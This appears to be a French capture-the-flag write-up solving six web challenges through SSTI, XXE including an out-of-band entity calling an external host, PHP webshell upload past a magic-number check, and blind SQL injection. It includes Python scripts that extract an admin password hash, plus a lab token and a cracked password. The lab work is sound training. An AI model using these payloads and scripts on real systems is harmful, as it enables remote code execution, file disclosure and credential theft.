## Chall 1

L’application affiche une bannière “Hello guest” et un champ texte permettant d’envoyer un paramètre GET `username`

Injection de la payload :
```
{{7*7}}
```

![[IMG-20251202152530398.png]]

Cela signifie que la chaîne `{{7*7}}` a été **interprétée** par le backend et non affichée telle quelle -> SSTI
Le nom du challenge est **“Serpent”**, ce qui suggère fortement un backend en **Python** qui utilise certainement un framework Flask.

Je recherche donc une payload qui me permet d'avoir une RCE pour una app Flask vulnérable au SSTI et je trouve ça:

![[IMG-20251202161148281.png]]

Payload:
```
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

Je test et valide la payload:

![[IMG-20251202161043032.png]]

J'affiche les fichiers présent dans le repertoire de l'app:

![[IMG-20251202161921671.png]]

Je trouve le flag et l'affiche:

![[IMG-20251202161952789.png]]

FLAG CHALL 1:

```
FLAG{http://home-2025-12-02-tdu3-b60612.wannatry.fr/j418w8w9cep09bc559jm427jare4aiz9-end.html}
```

## Chall 2

À l’ouverture du challenge, on découvre une interface très simple : une unique zone de texte permettant d’envoyer un message au serveur.


![[IMG-20251202194419296.png]]

Pour comprendre ce que l’application envoie réellement au serveur, j’intercepte la requête avec **Burp Suite**.  
On observe immédiatement que le formulaire n’envoie pas simplement la chaîne saisie par l’utilisateur :  
le champ `message` est intégré dans un **document XML complet**, puis **encodé en Base64** avant d’être transmis.

![[IMG-20251202194519522.png]]

En explorant le code JavaScript du site (`main.js`), on trouve la logique complète utilisée pour construire la requête POST.  
Ce code est important pour comprendre comment l’application traite l’entrée utilisateur.

![[IMG-20251202194539440.png]]

En analysant le code JavaScript, je comprends que l’application envoie en réalité un **document XML complet** via un POST.  
Ce XML est généré côté client, inséré dans la variable `xml_payload`, puis **encodé en Base64** grâce à la fonction `btoa()` avant d’être transmis au serveur.

Comme le serveur décode ce Base64 et exécute ensuite un `simplexml_load_string()`, il parse donc **un XML entièrement contrôlable par l’utilisateur**.  
À ce stade, une idée me vient immédiatement : cela ressemble fortement à une vulnérabilité de type **XXE (XML eXternal Entity)**.

Pour tester l’hypothèse, je construis un XML contenant :
1. une déclaration `DOCTYPE`,
2. une entité externe `xxe` pointant vers `/flag`,
3. et l’appel de cette entité dans la balise `<message>`.

Voici la payload:
```xml
<?xml version="1.0"?>
<!DOCTYPE document [
  <!ENTITY xxe SYSTEM "file:///flag">
]>
<document>
  <message>&xxe;</message>
</document>
```

- **`file:///flag`**  
    indique au parser XML de charger le contenu du fichier `/flag` présent sur le serveur (indice dans le code source main.js).
- **`<!ENTITY xxe SYSTEM "...">`**  
    définit une entité externe, donc une ressource dont le contenu sera récupéré lors du parsing XML.
- **`&xxe;`**  
    est remplacé **dynamiquement**, au moment du parsing, par le contenu du fichier chargé via `file:///`.

J'encode ensuite ma payload en base 64 en pensant à encoder les caractères spéciaux aussi pour m’assurer qu’aucun caractère réservé (`+`, `=`, `/`, etc.) ne sera modifié lors de l’envoi en POST.

![[IMG-20251202201955467.png]]

Cela me donne la chaîne que je devrai injecter dans le paramètre `xml=` lors de l’attaque. Ainsi, le serveur recevra un flux identique à celui qu’envoie le front-end, mais contenant ma propre structure XML exploitant la vulnérabilité XXE.

![[IMG-20251202202014666.png]]

Cela me permet d'obtenir le flag du deuxième challenge:

```
FLAG{http://home-2025-12-02-tdu3-b60612.wannatry.fr/abhnjlma6g0p1jeaw0yg3ekytvv4lb3o-end.html}
```


## Chall 3

Dans ce challenge, on dispose d’une fonctionnalité permettant de **mettre à jour sa photo de profil** en uploadant un fichier.  
J’ai donc commencé par tester un fichier arbitraire, avec différentes extensions, pour observer le comportement du serveur.

Très rapidement, je constate que **peu importe l’extension du fichier que j’essaie d’ajouter (.txt, .php, .jpg, etc.)**, l’application renvoie une erreur indiquant que **le type de fichier est incorrect**.  
Cela suggère fortement que le serveur ne se base pas uniquement sur l’extension, mais réalise un contrôle plus strict : **une vérification du “magic number” du fichier**.

Les magic numbers correspondent aux premiers octets d’un fichier, utilisés pour identifier son format réel.  
Par exemple, pour le format PNG :

![[IMG-20251202232830158.png]]

Ainsi, même si je renomme un fichier en `.png`, si son contenu ne commence pas par `89 50 4E 47`, l’application le rejettera.

Ce comportement indique donc que pour bypasser la vérification et uploader un fichier malveillant, je dois **fabriquer un fichier contenant un magic number valide**, puis y insérer du code arbitraire derrière.

Pour contourner la vérification du type de fichier réalisée côté serveur, j’ai créé un fichier dont les **premiers octets correspondent à la signature d’un vrai fichier PNG**

![[IMG-20251202233926481.png]]

- `89504E47` → signature hexadécimale du format PNG
- `xxd -r -p` → convertit l’hex en données binaires
- `poc.php` → fichier final (extension PHP pour la suite du bypass)

Une fois mon fichier forgé avec un magic number PNG valide, je procède à l’upload.  
Cette fois-ci, **le fichier passe la vérification du serveur** et l’application affiche un message confirmant que la photo de profil a été mise à jour.

J’ouvre alors **Burp Suite** pour observer ce qui se passe après l’envoi du formulaire.  
En interceptant la requête et le trafic suivant, je remarque immédiatement qu’une requête GET est effectuée automatiquement vers :

```
/uploads/profile-picture.php
```

![[IMG-20251202234205659.png]]

Lorsque j’accède directement au fichier que j’ai uploadé, je constate que le navigateur affiche bien le début du fichier, incluant le magic number PNG:

![[IMG-20251202234823095.png]]

Juste après cette signature, tout le contenu est interprété comme du PHP par le serveur.  
Je décide donc d’y injecter un webshell minimaliste à la suite du magic number, afin d’exécuter des commandes arbitraires :

![[IMG-20251202234844788.png]]
Ce fichier est toujours accepté comme une image par le mécanisme de vérification (grâce au magic number), mais **le serveur continue de l’exécuter comme un script PHP**, car son extension reste `.php`.
Une fois uploadé, on obtient le flag dans /uploads/profile-picture.php

![[IMG-20251202234944708.png]]

```
FLAG{http://home-2025-12-02-tdu3-b60612.wannatry.fr/rigfw8y3wyo257buunoro1w1kb3g0968-end.html}
```
## Chall 4

Après authentification, l’application redirige l’utilisateur vers une page affichant une liste d’articles.  
Lorsqu’un article est sélectionné, le navigateur envoie la requête suivante :

```html
GET /api/posts/<id-post>?<timestamp> HTTP/2
```
Ici, `<id-post>` représente l’identifiant numérique de l’article.
La réponse associe bien l’ID à un contenu retourner sous format JSON :
![[Pasted image 20251204234022.png]]
Cela indique  que l’API récupère l’article correspondant depuis la base de données en fonction de l’ID fourni dans l’URL.
Pour tester la robustesse du paramètre, on remplace l’ID numérique par une chaîne arbitraire :

```
GET /api/posts/test?1764887814058 HTTP/2
```

![[Pasted image 20251204174836.png]]

Dans Burp Suite, on observe une erreur renvoyée par le serveur.  Elle **provient directement du moteur MySQL**, et révèle plusieurs éléments importants :
- l’application insère la valeur située après `/posts/` **directement dans une requête SQL**,
- sans validation ni échappement correct,
- en l’interprétant comme un champ ou une condition SQL.

Pour vérifier que la valeur injectée est bien interprétée dans la requête SQL, j’envoie la payload suivante :

```sql
1 OR SLEEP(5)
```

J’observe alors que la réponse met systématiquement cinq secondes à revenir, ce qui confirme que le paramètre est effectivement injecté dans la requête SQL et que la vulnérabilité SQLi est exploitable.
J’essaye ensuite d’envoyer une payload permettant de contourner totalement la condition du `WHERE` afin de récupérer l’intégralité des enregistrements :

```sql
1 OR 1=1--
```

Cependant, malgré une injection syntaxiquement correcte, la réponse retournée par l’API reste strictement identique :

```json
{
    "id": 1,
    "username": "admin",
    "title": "First",
    "content": "I like to be the first one to post comment"
}

```

Aucune donnée supplémentaire n’apparaît, ce qui indique que, même si la requête SQL est bien modifiée, l’application n’affiche qu’un seul enregistrement dans sa réponse.
Cependant, puisque la requête ne renvoie pas d’erreur, cela signifie que l’injection est bien exécutée par le serveur, même si le résultat n’est pas affiché.  
Je décide donc de tirer parti de ce comportement pour tenter d’extraire des informations sur la base de données.
Comme première étape, j’essaie de vérifier si une table nommée `users` existe dans le schéma actuel.  
Pour cela, j’envoie la payload suivante :

```sql
1 UNION SELECT username,password FROM users--
```

J'obtiens cette erreur remonté par le server:

![[Pasted image 20251204235633.png]]

Cela confirme que la table `users` n’existe pas dans la base de données.  
Je poursuis donc mes tests en ciblant une table potentiellement nommée `user`.  
Cette fois, le serveur n’émet aucune erreur, ce qui laisse supposer que la table existe bien.

À partir de là, je peux utiliser des injections conditionnelles basées sur la fonction `SLEEP(0.2)` afin d’inférer des informations sur la base de données.  
Le principe est simple : si la condition que je teste est vraie, MySQL exécute `SLEEP(0.2)` et la réponse du serveur est retardée. Si elle est fausse, la requête s’exécute normalement et la réponse arrive immédiatement.  
Cette différence de temps me permet donc de déterminer, sans jamais voir directement le résultat SQL, si une condition est vérifiée ou non.
Grâce à ce mécanisme, je peux confirmer la présence de l’utilisateur `admin`, récupérer la longueur de son mot de passe, puis en extraire le hash caractère par caractère.

- Cette requête me permet de vérifier que l’entrée “admin” est bien présente dans la table.
```sql
1 OR IF((SELECT COUNT(*) FROM user WHERE username='admin')>0, SLEEP(0.2), 0)
```

- Ici, je confirme que le mot de passe associé à l’utilisateur admin comporte 32 caractères.
```sql
1 OR IF((SELECT LENGTH(password) FROM user WHERE username='admin')=32, SLEEP(0.2), 0)
```

- Enfin, je créé une requête qui me permet de récupérer un caractère précis du mot de passe.
```sql
1 OR IF(SUBSTRING((SELECT password FROM user WHERE username='admin'),1,1)='a', SLEEP(0.2), 0)
```

En répétant l’opération pour chaque position et pour chaque caractère possible, il devient alors possible d’exfiltrer l’intégralité du hash associé à l’utilisateur admin. Cette étape étant trop longue à faire à la main , je décide de créer un script python pour trouver le mot de passe:
```python
import requests
import time

url = "https://k5et0n88lteob5nq0fyte1ajpfd79g3m-2025-12-02-tdu3-b60612.wannatry.fr/api/posts/"
token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InRlc3QiLCJpYXQiOjE3NjQ4NjQ4NDd9.YQarMCZiOnLh6ToX8uCGAARbxinhwE4H1SR3hdfaFMc"
headers = {"Authorization": token}

chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_-=!"
length = 32
result = ""

for i in range(1, length + 1):
    for c in chars:
        payload = f"1 OR IF(SUBSTRING((SELECT password FROM user WHERE username='admin'),{i},1)='{c}',SLEEP(0.2),0)"
        t0 = time.time()
        requests.get(url + payload, headers=headers)
        if time.time() - t0 > 0.2:
            result += c
            print(result)
            break

print("password:", result)
```

Après execution du script, j'obtiens ce résultat:
![[Pasted image 20251205000419.png]]

Le mot de passe récupéré est un hash MD5. Je le met dans crackstation et récupère le mot de passe admin associé:

![[Pasted image 20251204180730.png]]
yerramshettysumlok
Enfin je me connect entant qu'admin au site, et j'accède au flag:

![[Pasted image 20251204180802.png]]

```
FLAG{http://home-2025-12-02-tdu3-b60612.wannatry.fr/mwex0emeea7ycbs4pwjim2k1jrof6utu-end.html}
```

## Chall 5

![[IMG-20251205031810382.png]]
https://app.interactsh.com/#/

```xml
<!DOCTYPE xxe [
  <!ENTITY test SYSTEM "http://azxtrmtedzbcsenavtvoj2xgzxir184d7.oast.fun/">
]>
<doc>&test;</doc>
```

![[IMG-20251205035312111.png]]

https://paste.c-net.org/

![[IMG-20251205033822725.png]]

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM
"https://paste.c-net.org/WenchBusted"> %xxe;]>
<doc>&xxe;
```

![[IMG-20251205034011844.png]]


```
FLAG{http://home-2025-12-02-tdu3-b60612.wannatry.fr/qk7gi3xb2a3rzsx9edxylqczm4xvq9xm-end.html}
```

## Chall 6

![[IMG-20251205221651925.png]]

![[IMG-20251205231633285.png]]


![[IMG-20251205221937938.png]]

![[IMG-20251205221625977.png]]

```sql
' OR (SELECT substr(content,1,1) FROM post WHERE id=6)='t' -- 
```


```python
import requests

url = "https://9iunt92zjij47u856z1jme0uy5974ar2-2025-12-02-tdu3-b60612.wannatry.fr/api/authenticate"

chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_-=!?.:;,+/()[]<>@#&%*$ "
result = ""
i = 1

while True:
    found = False
    for c in chars:
        payload = {
            "username": f"' OR (SELECT substr(content,{i},1) FROM post WHERE id=5)='{c}' -- ",
            "password": "x"
        }

        r = requests.post(url, json=payload)
        j = r.json()

        if j.get("error") == False:
            result += c
            print(f"{result}")
            found = True
            break


    i += 1
```

![[IMG-20251205232138373.png]]

```
flag{http://home-2025-12-02-tdu3-b60612.wannatry.fr/3nwhe9e1bdq7lc7uqueo4kmcasizwvuw-end.html}   
```

